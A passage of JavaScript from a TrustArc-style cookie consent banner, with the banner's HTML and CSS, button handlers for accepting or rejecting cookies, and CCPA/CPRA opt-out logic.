     font-family: "Muller-Black","Mullerbold",sans-serif;      margin: 0;    letter-spacing: -0.02em;text-transform: uppercase;  }  .truste-buttonsColumn {          text-align: center;    display: flex;    align-items: center;        margin: 0;    margin-top: 56px;  }  a#truste-cookie-button {      float: right;      margin-top: 10px;  }        /* MEDIA QUERIES */    @media screen and (max-width: 700px) {          div#truste-consent-text h1 {      line-height: 21.12px;  }      .truste-messageColumn{        font-size:12px;        line-height: 140%;      }    div.truste-consent-content-wrapper {        padding: 32px 31px;      }      .truste-buttonsColumn{               margin-top: 32px;    flex-direction: column-reverse;      }      button#truste-show-consent{        text-align:center;        margin: 0 auto;      }      .truste-button2{        width:100%;        box-sizing:border-box;        margin:0;        margin-bottom:26px;      }      #truste-consent-button{        order: 2;      }    }      </style><div id="truste-consent-track" style="">  <div id="trustarc-banner-overlay"></div>  <div class="truste-consent-content-wrapper">    <div id="truste-consent-content" class="truste-banner" style="overflow: hidden; max-width: 100%; max-height:auto;">          <div id="truste-consent-text" class="truste-messageColumn">        <h1>About Cookies on this Site</h1>        <p>Cookies are important to the proper functioning of the site. To improve your experience, we use cookies to remember log-in details and provide secure log-in, remember what&#39;s in your basket or how far through an order you are, collect statistics and analyse site usage to optimize site functionality, and deliver content tailored to your interests. We also use cookies for advertising to promote our products to site visitors, both on and off our site.</p>        <p>Click &#34;Accept all&#34; to accept all cookies and go directly to the site or click on Manage Cookie Settings for more information and to choose whether to accept certain cookies. You may also choose to reject all cookies.&nbsp;By clicking &quot;Reject All Cookies&quot;, you reject to the storing of cookies on your device that are not required to enable core site functionality.</p>        </div>        <div id="truste-consent-buttons" class="truste-buttonsColumn">                     <button id="truste-show-consent" type="button">Manage Cookie Settings</button>                   <button id="truste-consent-button" type="button" class="truste-button2">Accept All</button>         <button id="truste-consent-required" type="button" class="truste-button2">Reject All</button>        </div>         </div>      </div>  </div>';
      L = L.replace("&lt;i&gt;", "<i>").replace("&lt;/i&gt;", "</i>").replace("&lt;b&gt;", "<b>").replace("&lt;/b&gt;", "</b>");
      if (!L || L.length < 15) {
        L = '<div id="truste-consent-track" style="display:none; background-color:#000;"><div id="truste-consent-content" style="overflow: hidden; margin: 0 auto; max-width: 1000px"><div id="truste-consent-text" style="float:left; margin:15px 0 10px 10px; width:500px;"><h2 style="color: #fff; font-size: 16px; font-weight:bold; font-family:arial;">Some functionality on this site requires your consent for cookies to work properly.</h2><div id="truste-repop-msg" style="padding: 0px 0px 5px 0px;font-size: 12px;color: #F0C36D; display:none; font-family: arial,sans-serif;"></div></div><div id="truste-consent-buttons" style="float:right; margin:20px 10px 20px 0;"><button id="truste-consent-button" type=button style="padding:5px; margin-right:5px; font-size:12px;">I consent to cookies</button><button id="truste-show-consent" type=button style="padding:5px; margin-right:5px; font-size:12px;">I want more information</button></div></div></div>';
      }
      if (K.responsive === "false") {
        L = L.replace(/(class=["'].*?)[\s]?truste-responsive(.*?["'])/g, "$1$2");
      }
      if (o.insertAdjacentHTML) {
        o.insertAdjacentHTML("afterbegin", L);
      } else {
        o.innerHTML = L;
      }
    }
    function y(N) {
      var M = truste.util && truste.util.getJSON || truste.cma && truste.cma.cheapJSON || window.JSON.stringify,
        L = {
          source: "preference_manager",
          message: N,
          data: {
            useNonStandardStacks: false,
            consentScreen: 1
          }
        };
      window.postMessage && window.postMessage(M(L), "*");
    }
    function I() {
      self.localStorage.removeItem(truste.eu.COOKIE_CATEGORY_NAME);
      truste.eu.ccpa.dropCcpaCookie(false);
      l(D);
    }
    function z() {
      var L = truste.eu.bindMap;
      truste.eu.ccpa.dropCcpaCookie(true);
      if (L && L.prefmgrUrl && (K.gtm || truste.eu.noticeLP.gtm == 1)) {
        truste.bn.hide(document.getElementById(u));
        l("0");
        truste.util.callCMEndpoint("/defaultconsentmanager/getOptOutDomains?", null, function (N) {
          var M = N.responseText;
          if (M && truste.util.parseJSON(M)) {
            truste.util.setStorage(truste.eu.COOKIE_CATEGORY_NAME, M, false);
          }
        });
      } else {
        if (truste.eu && truste.eu.clickListener) {
          truste.eu.clickListener(3);
        }
      }
    }
    function l(L) {
      var P = truste.util.getLowestConsent(L);
      if (!isNaN(P = parseInt(P)) && truste.eu && truste.eu.actmessage) {
        var N = truste.util && truste.util.getJSON || truste.cma && truste.cma.cheapJSON || window.JSON.stringify,
          M = {
            source: "preference_manager",
            message: "submit_preferences",
            data: {
              value: L
            }
          };
        truste.eu.actmessage(M);
        if (window.PREF_MGR_API_DEBUG) {
          PREF_MGR_API_DEBUG.authorities.push(window.location.hostname);
        }
        window.postMessage && window.postMessage(N(M), "*");
        var O = truste.eu.bindMap;
        if (O && O.prefmgrUrl && !O.feat.ccpaApplies) {
          truste.util.callCMEndpoint("/defaultconsentmanager/optin?", P, function () {}, true);
        }
        E("selection");
      } else {
        E("done");
      }
    }
    function s() {
      var L = truste.eu.bindMap;
      if (L.feat.isReconsentEvent && L.popupMsg.length > 0) {
        var M = document.getElementById(x.repopDiv);
        if (M) {
          M.innerHTML = L.popupMsg;
          truste.bn.show(M);
        }
      }
      var O = document.getElementById(x.consentButton);
      if (O) {
        var N = new RegExp(("^" + D + "$").replace(/,/g, "."));
        if (!K.gtm && !L.feat.enableCCPA && L.feat.isRepopEvent && !N.test(L.prefCookie)) {
          O.style.display = "none";
        } else {
          O.onclick = function () {
            truste.bn.msglog("accepts", b.bannerMsgURL);
            if (b.feat.iabBannerApplies) {
              y("process_iab_accept_all");
            }
            if ((L.feat.enableCCPA || L.feat.isReconsentEvent) && L.feat.enableTwoStepVerification && truste.util.validConsent(L.prefCookie) && !N.test(L.prefCookie)) {
              if (truste.eu && truste.eu.clickListener) {
                truste.eu.clickListener(6);
              }
            } else {
              I();
            }
          };
        }
      }
      O = document.getElementById(x.footerCallback);
      if (O) {
        O.setAttribute("aria-haspopup", "true");
        O.onclick = function () {
          truste.bn.msglog("moreinfo", b.bannerMsgURL);
          if (truste.eu && truste.eu.clickListener) {
            if (b.feat.iabBannerApplies) {
              truste.eu.clickListener(4);
            } else {
              truste.eu.clickListener(parseInt(K.pn) || 0);
            }
            L.returnFocusTo = x.footerCallback.replace("#", "");
          }
        };
      }
      O = document.getElementById(x.requiredButton);
      if (O) {
        O.onclick = function () {
          truste.bn.msglog("requiredonly", b.bannerMsgURL);
          if (truste.eu.cpra && truste.eu.cpra.shouldShowFinProg()) {
            truste.eu.clickListener(7, true, {
              cpraConsent: "0",
              cpraSource: "banner-decline"
            });
            return;
          } else {
            if (b.feat.iabBannerApplies) {
              y("process_iab_reject_all");
            }
            z();
          }
        };
      }
      O = document.getElementById(x.ccpaOptoutButton);
      if (O) {
        O.onclick = function () {
          truste.bn.msglog("requiredonly", b.bannerMsgURL);
          if (truste.eu.cpra && truste.eu.cpra.shouldShowFinProg()) {
            truste.eu.clickListener(7, true, {
              cpraConsent: "0",
              cpraSource: "banner-decline-ccpa"
            });
            return;
          } else {
            truste.bn.declineCPRA();
          }
        };
      }
      O = document.getElementById(x.cookieButton);
      if (O) {
        if (K.cookieLink) {
          O.href = K.cookieLink;
        }
        O.onclick = function (P) {
          truste.bn.msglog("cookiepolicy", b.bannerMsgURL);
          if (K.cookieLink) {
            P.preventDefault();
            window.open(K.cookieLink);
          }
        };
      }
      O = document.getElementById(x.privacyButton);
      if (O) {
        if (K.privacypolicylink) {
          O.href = K.privacypolicylink;
        }
        O.onclick = function (P) {
          if (K.privacypolicylink) {
            P.preventDefault();
            window.open(K.privacypolicylink);
          }
        };
      }
      O = document.getElementById(x.closeBanner);
      if (O) {
        O.onclick = function () {
          var P = truste.eu.bindMap;
          var Q = truste.util.validConsent(P.prefCookie);
          var R = P.feat.optoutClose && !Q;
          if (R) {
            if (truste.eu.cpra && truste.eu.cpra.shouldShowFinProg()) {
              truste.eu.clickListener(7, true, {
                cpraConsent: "0",
                cpraSource: "banner-decline"
              });
              return;
            } else {
              z();
            }
          } else {
            E("done");
          }
        };
      }
      O = document.getElementById(x.iabPartnersLink);
      if (O) {
        O.onclick = function () {
          truste.eu.clickListener(5);
          L.returnFocusTo = x.iabPartnersLink.replace("#", "");
        };
        O.onkeyup = function (P) {
          if (P.keyCode == 13) {
            truste.eu.clickListener(5);
            L.returnFocusTo = x.iabPartnersLink.replace("#", "");
          }
        };
      }
      O = document.getElementById(x.secondIabPartnersLink);
      if (O) {
        O.onclick = function () {
          truste.eu.clickListener(5);
          L.returnFocusTo = x.secondIabPartnersLink.replace("#", "");
        };
        O.onkeyup = function (P) {
          if (P.keyCode == 13) {
            truste.eu.clickListener(5);
            L.returnFocusTo = x.secondIabPartnersLink.replace("#", "");
          }
        };
      }
      j();
      parseInt(K.fade) && setTimeout(function () {
        l(K.sl);
      }, parseInt(K.fade));
      E("open");
    }
    function j() {
      var L = truste.eu.bindMap;
      if (L.feat.ccpaApplies) {
        var O = truste.eu.ccpa.getOptout();
        var N = document.getElementById(x.ccpaOptedOut);
        var Q = document.getElementById(x.ccpaOptedIn);
        var P = document.getElementById(x.ccpaNoPreference);
        if (O && L.prefCookie) {
          var M = /^[yY]$/;
          if (M.test(O)) {
            N && truste.bn.show(N);
            Q && truste.bn.hide(Q);
            P && truste.bn.hide(P);
          } else {
            N && truste.bn.hide(N);
            Q && truste.bn.show(Q);
            P && truste.bn.hide(P);
          }
        } else {
          N && truste.bn.hide(N);
          Q && truste.bn.hide(Q);
          P && truste.bn.show(P);
        }
      }
    }
    function w() {
      if (K.oc) {
        truste.bn.addEvent(document, "click", q);
      }
      if (K.px) {
        truste.bn.addEvent(document, "scroll", r);
      }
    }
    function G() {
      truste.bn.isConsentTrack = true;
      truste.bn.show(document.getElementById(u));
      truste.bn.msglog("views", b.bannerMsgURL);
    }
    function B() {
      E("done");
      truste.bn.msglog("returns", b.bannerMsgURL);
    }
    function n(L) {
      return L && truste.bn.isVisible(L) && !document.getElementById(truste.eu.popdiv2);
    }
    function q(M) {
      var L = document.getElementById(u);
      if (n(L) && !L.contains(M.target) && M.target.id !== truste.eu.popclose) {
        l(D);
      }
    }
    function r(M) {
      var L = document.getElementById(u);
      if (n(L) && (document.scrollingElement.scrollTop || document.documentElement.scrollTop) >= K.px) {
        l(D);
      }
    }
    truste.bn.reopenBanner = function () {
      if (o) {
        truste.bn.isConsentTrack = true;
        E.done = 0;
        w();
        s();
        truste.bn.show(document.getElementById(u));
      }
    };
    truste.bn.twoStepConfirmed = function () {
      truste.eu.ccpa.dropCcpaCookie(false);
      l(D);
      truste.bn.msglog("twostepoptin", b.bannerMsgURL);
    };
    truste.bn.twoStepDeclined = function () {
      E("done");
    };
    truste.bn.acceptAll = function () {
      I();
    };
    truste.bn.declineAll = function () {
      z();
    };
    truste.bn.declineCPRA = function () {
      truste.eu.ccpa.dropCcpaCookie(true);
      l("0");
    };
    truste.bn.handleBannerDone = function () {
      var L = truste.eu.bindMap;
      if (!truste.eu.isGPCDNTEvent() || !L.feat.dntShowUI) {
        E("done");
      } else {
        j();
      }
    };
  }
};